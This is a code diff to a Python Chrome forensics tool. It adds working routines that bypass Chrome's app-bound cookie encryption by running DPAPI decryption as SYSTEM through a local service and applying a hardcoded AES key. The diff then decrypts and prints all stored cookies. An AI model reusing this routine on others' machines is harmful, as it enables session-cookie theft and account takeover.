@@ -8,6 +8,9 @@ import csv
 import datetime
 import sys
 import timeit
+from pypsexec.client import Client
+import pathlib
+import binascii
 
 from struct import unpack # upack from buffer -> returns tuple
 import copy
@@ -259,6 +262,7 @@ class Chrome_Forensics:
             self.base_path = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/")
         self.history_db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/History')
         self.master_key = self.get_master_key()
+        self.init_v20()
     #-------------------------------------------------------------------------------------------------------------------------#
     # 
     # [[Utility]]
@@ -309,7 +313,77 @@ class Chrome_Forensics:
             decrypted_data = decrypted_data.decode('utf-8')
             return decrypted_data
         except:
-            return None
+            iv = buffer[3:15]
+            encrypted_value = buffer[15:-16]
+            tag = buffer[-16:]
+            cipher = AES.new(self.v20key, AES.MODE_GCM, nonce=iv)
+            decrypted_cookie = cipher.decrypt_and_verify(encrypted_value, tag)
+            return decrypted_cookie[32:].decode('utf-8')
+    
+    def init_v20(self):
+        user_profile = os.environ['USERPROFILE']
+        local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
+        cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+
+        with open(local_state_path, "r") as f:
+            local_state = json.load(f)
+
+        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+
+
+
+        arguments = "-c \"" + """import win32crypt
+        import binascii
+        encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+        print(binascii.b2a_base64(encrypted_key[1]).decode())
+        """.replace("\n", ";") + "\""
+
+
+        c = Client("localhost")
+        c.connect()
+
+        try:
+            c.create_service()
+
+            assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
+            app_bound_encrypted_key_b64 = binascii.b2a_base64(
+                binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
+
+
+            # decrypt with SYSTEM DPAPI
+            encrypted_key_b64, stderr, rc = c.run_executable(
+                sys.executable,
+                arguments=arguments.format(app_bound_encrypted_key_b64),
+                use_system_account=True
+            )
+
+
+            # decrypt with user DPAPI
+            decrypted_key_b64, stderr, rc = c.run_executable(
+                sys.executable,
+                arguments=arguments.format(encrypted_key_b64.decode().strip()),
+                use_system_account=False
+            )
+
+            decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
+
+            assert(decrypted_key[0] == 1)
+
+        finally:
+            c.remove_service()
+            c.disconnect()
+
+        # decrypt key with AES256GCM
+        # aes key from elevation_service.exe
+        aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+
+
+        iv = decrypted_key[1:1+12]
+        ciphertext = decrypted_key[1+12:1+12+32]
+        tag = decrypted_key[1+12+32:]
+        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+        self.v20key = cipher.decrypt_and_verify(ciphertext, tag)
+
         
     def exec_query(self, query, db_path = None, list_mode = False):
         if not db_path:
@@ -358,12 +432,15 @@ class Chrome_Forensics:
             
     def get_chrome_cookies(self):
         db_path = self.base_path + "Default/Network/Cookies"
-        query = "SELECT host_key, name, encrypted_value FROM cookies;"
+        query = "SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;"
         cookiedb_data = self.exec_query(query=query, db_path=db_path)
 
         result_data = {}
-        for row in cookiedb_data:
+        c = 1
+        for row in cookiedb_data: 
+            print(c)
             host_key = row[0]
+            print(row[2])
             data = {
                 'name' : row[1],
                 'decrypted_value' : self.decrypt_data(row[2])
@@ -755,7 +832,7 @@ class Forensic_View():
                        "Top Sites":"top_sites"}
         
         test_list = {"Bookmarks":"bookmarks"}
-        self.data_obj.cache_parse()
+        #self.data_obj.cache_parse()
         self.add_tab_views(source_list)
         self.app.mainloop()
 
